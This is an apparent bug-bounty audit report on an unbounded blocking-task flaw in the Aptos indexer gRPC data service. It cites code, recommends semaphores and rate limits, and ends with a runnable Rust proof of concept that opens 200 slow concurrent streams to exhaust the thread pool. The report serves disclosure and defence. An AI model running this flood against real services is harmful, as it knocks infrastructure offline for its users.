# Audit Report

## Title
Tokio Blocking Thread Pool Exhaustion via Unbounded Concurrent Deserialization in Indexer gRPC Data Service

## Summary
The indexer-grpc-data-service spawns unbounded blocking tasks for CPU-intensive transaction deserialization without any concurrency control, allowing an attacker to exhaust the tokio blocking thread pool through concurrent requests, causing service deadlock and denial of service.

## Finding Description

The `get_transactions_with_durations()` method in the file store operator uses `tokio::task::spawn_blocking` to offload CPU-intensive decompression and deserialization work to the blocking thread pool. [1](#0-0) 

However, there are **no concurrency limits** on:
1. The number of concurrent gRPC client connections
2. The number of concurrent requests being processed
3. The number of blocking tasks that can be spawned

The data service spawns a new task for each incoming gRPC request [2](#0-1) , and each request can spawn up to `MAX_FETCH_TASKS_PER_REQUEST = 5` concurrent subtasks [3](#0-2) .

Each subtask can call `get_transactions_with_durations`, spawning a blocking task for deserialization work. Additionally, cache hits also spawn blocking tasks via `deserialize_cached_transactions`. [4](#0-3) 

The gRPC server configuration lacks any concurrency limiting mechanisms. [5](#0-4) 

**Attack Path:**
1. Attacker opens 100+ concurrent gRPC streams to the data service
2. Each stream requests transactions that must be fetched from file store (bypassing cache)
3. Each request spawns up to 5 concurrent tasks = 500+ concurrent tasks
4. Each task spawns a blocking task for LZ4 decompression and protobuf deserialization [6](#0-5) 
5. The tokio blocking thread pool (default 512 threads) becomes saturated
6. New blocking tasks queue indefinitely
7. If any async operation needs spawn_blocking to make progress, deadlock occurs
8. Service becomes completely unresponsive

## Impact Explanation

This qualifies as **High Severity** under the Aptos bug bounty program for the following reasons:

1. **API Crashes**: The indexer data service API becomes completely unresponsive, preventing all clients from accessing historical transaction data. This affects wallets, explorers, and other ecosystem applications.

2. **Service Unavailability**: Once the blocking thread pool is exhausted, the service enters a deadlock state where it cannot process any new requests, requiring a restart to recover.

3. **No Authentication Required**: The service can be configured with `disable_auth_check: true`, allowing unauthenticated attackers to exploit this vulnerability.

4. **Infrastructure Impact**: While this doesn't directly affect consensus or validator operations, it impacts critical infrastructure that the Aptos ecosystem relies on for data access.

## Likelihood Explanation

**Likelihood: HIGH**

- **Attacker Requirements**: None - any network client can connect to the gRPC service
- **Complexity**: Low - attacker simply needs to open many concurrent connections and request transactions
- **Detectability**: Low - legitimate clients may also make concurrent requests, making malicious traffic hard to distinguish
- **Default Configuration**: The service has no rate limiting by default
- **Resource Requirements**: Minimal - attacker needs bandwidth to open connections but doesn't need to send large amounts of data

## Recommendation

Implement multiple layers of concurrency control:

1. **Add connection-level concurrency limiting in gRPC server**:
```rust
Server::builder()
    .concurrency_limit_per_connection(10)
    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
```

2. **Add a semaphore to limit concurrent blocking tasks**:
```rust
// In RawDataServerWrapper
pub struct RawDataServerWrapper {
    // ... existing fields ...
    blocking_task_semaphore: Arc<tokio::sync::Semaphore>,
}

// Before spawn_blocking in get_transactions_with_durations:
let permit = self.blocking_task_semaphore.acquire().await?;
let transactions_in_storage = tokio::task::spawn_blocking(move || {
    let _permit = permit; // Hold permit until task completes
    FileEntry::new(bytes, storage_format).into_transactions_in_storage()
})
.await?;
```

3. **Add request-level rate limiting** using a token bucket or similar algorithm.

4. **Configure tokio runtime with increased blocking thread pool**:
```rust
#[tokio::main(worker_threads = 8, max_blocking_threads = 1024)]
async fn main() -> Result<()> {
    // ...
}
```

## Proof of Concept

```rust
// PoC: Exhaust blocking thread pool via concurrent requests
use aptos_protos::indexer::v1::{raw_data_client::RawDataClient, GetTransactionsRequest};
use tokio;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target = "http://localhost:50051"; // Data service endpoint
    
    // Spawn 200 concurrent tasks
    let mut handles = vec![];
    for i in 0..200 {
        let target = target.to_string();
        let handle = tokio::spawn(async move {
            let mut client = RawDataClient::connect(target).await.unwrap();
            
            // Request transactions, forcing file store access by requesting old data
            let request = GetTransactionsRequest {
                starting_version: Some(i * 10000), // Old versions likely evicted from cache
                transactions_count: Some(10000),
            };
            
            // Keep the stream open, consuming slowly
            let mut stream = client.get_transactions(request).await.unwrap().into_inner();
            while let Ok(Some(_)) = stream.message().await {
                tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
            }
        });
        handles.push(handle);
    }
    
    // Wait for all tasks - service should become unresponsive
    futures::future::join_all(handles).await;
    
    Ok(())
}
```

**Expected Result**: After ~100 concurrent connections requesting file store data, the service's blocking thread pool becomes saturated. New requests hang indefinitely, and the service becomes unresponsive. Metrics will show a large queue of pending blocking tasks.

## Notes

While the indexer-grpc-data-service is not part of the core consensus or validator infrastructure, it is critical infrastructure for the Aptos ecosystem. The absence of any concurrency controls combined with CPU-intensive blocking operations creates a trivial DoS vector that can completely disable the service with minimal attacker resources.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/file_store_operator/mod.rs (L70-74)
```rust
        let transactions_in_storage = tokio::task::spawn_blocking(move || {
            FileEntry::new(bytes, storage_format).into_transactions_in_storage()
        })
        .await
        .context("Converting storage bytes to FileEntry transactions thread panicked")?;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L70-73)
```rust
// Max number of tasks to reach out to TXN stores with
const MAX_FETCH_TASKS_PER_REQUEST: u64 = 5;
// The number of transactions we store per txn block; this is used to determine max num of tasks
const TRANSACTIONS_PER_STORAGE_BLOCK: u64 = 1000;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L192-208)
```rust
        tokio::spawn({
            let request_metadata = request_metadata.clone();
            async move {
                data_fetcher_task(
                    redis_client,
                    file_store_operator,
                    cache_storage_format,
                    request_metadata,
                    transactions_count,
                    tx,
                    txns_to_strip_filter,
                    current_version,
                    in_memory_cache,
                )
                .await;
            }
        });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L694-709)
```rust
async fn deserialize_cached_transactions(
    transactions: Vec<Vec<u8>>,
    storage_format: StorageFormat,
) -> anyhow::Result<Vec<Transaction>> {
    let task = tokio::task::spawn_blocking(move || {
        transactions
            .into_iter()
            .map(|transaction| {
                let cache_entry = CacheEntry::new(transaction, storage_format);
                cache_entry.into_transaction()
            })
            .collect::<Vec<Transaction>>()
    })
    .await;
    task.context("Transaction bytes to CacheEntry deserialization task failed")
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L204-213)
```rust
            tasks.push(tokio::spawn(async move {
                Server::builder()
                    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
                    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
                    .add_service(svc_clone)
                    .add_service(reflection_service_clone)
                    .serve(listen_address)
                    .await
                    .map_err(|e| anyhow::anyhow!(e))
            }));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/compression_util.rs (L144-150)
```rust
            CacheEntry::Lz4CompressionProto(bytes) => {
                let mut decompressor = Decoder::new(&bytes[..]).expect("Lz4 decompression failed.");
                let mut decompressed = Vec::new();
                decompressor
                    .read_to_end(&mut decompressed)
                    .expect("Lz4 decompression failed.");
                Transaction::decode(decompressed.as_slice()).expect("proto deserialization failed.")
```
